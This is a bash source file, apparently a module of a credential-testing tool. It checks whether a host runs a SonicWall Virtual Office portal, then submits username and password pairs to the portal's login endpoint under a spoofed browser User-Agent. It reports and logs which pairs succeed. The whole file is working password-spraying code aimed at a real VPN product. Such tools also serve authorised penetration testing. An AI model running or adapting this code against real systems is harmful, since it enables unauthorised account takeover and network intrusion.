#!/bin/bash

check_SonicWallVOffice(){
	check_Portal=$(wget --timeout=4 -qO- https://$1/cgi-bin/welcome --no-check-certificate);
	if ([ "$(echo $check_Portal | grep 'VirtualOffice' )" ]) || [ $(echo "$5" | tr '[:upper:]' '[:lower:]' ) == "disable_check" ] || [ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "disable_check" ] || [ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "disable_check" ] ; then
		:
	else
		echo "Either not a SonicWall Virtual Office portal, or not compatible version.";
		echo "Exiting...";
		exit 1;
	fi

}

POST_SonicWallVOffice(){
				POST=$(curl -i -s -k  -X $'POST' \
		    -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0' -H $'Content-Type: application/x-www-form-urlencoded' -H $'X-Requested-With: XMLHttpRequest' -H $'Referer: https://'$1'/cgi-bin/welcome' \
		    --data-binary $'username='$line'&password='$pass'&state=login&login=true&verifyCert=0&portalname=VirtualOffice&ajax=true' \
		    $'https://'$1'/cgi-bin/userLogin');
				#If Logging is enabled Single User
				if [[ $(echo "$5" | tr '[:upper:]' '[:lower:]') == "debug" ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "debug" ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "debug" ]]; then
					echo "host:$1 username:$line password:$pass" >> /tmp/conformer.debug;
					echo "" >> /tmp/conformer.debug;			
					echo "$POST" >> /tmp/conformer.debug;
					echo "" >> /tmp/conformer.debug;	
					echo "" >> /tmp/conformer.debug;	
					echo "-------------------------------------------------------------" >> /tmp/conformer.debug;	
				fi
				#checks cookie to see if successful login
				if [[ $POST == *"success"* ]]; then
					echo "	$line:$pass:**Success**";
				# Logging
				if [[ $(echo "$5" | tr '[:upper:]' '[:lower:]') == "log" ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "log" ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "log" ]]; then
					echo "	$line:$pass:**Success**" >> /tmp/conformer.log;
				fi
				elif [[ $POST == *"failure"* ]]; then
					echo "	$line:$pass:Fail";
				# Logging
				if [[ $(echo "$5" | tr '[:upper:]' '[:lower:]') == "log" ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "log" ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "log" ]]; then
					echo "	$line:$pass:Fail" >> /tmp/conformer.log;
				fi
				else
					echo "	$line:$pass:Fail --- Page not responding properly.";
				if [[ $(echo "$5" | tr '[:upper:]' '[:lower:]') == "log" ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "log" ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "log" ]]; then
					echo "	$line:$pass:Fail --- Page not responding properly." >> /tmp/conformer.log;
				fi
				fi
}
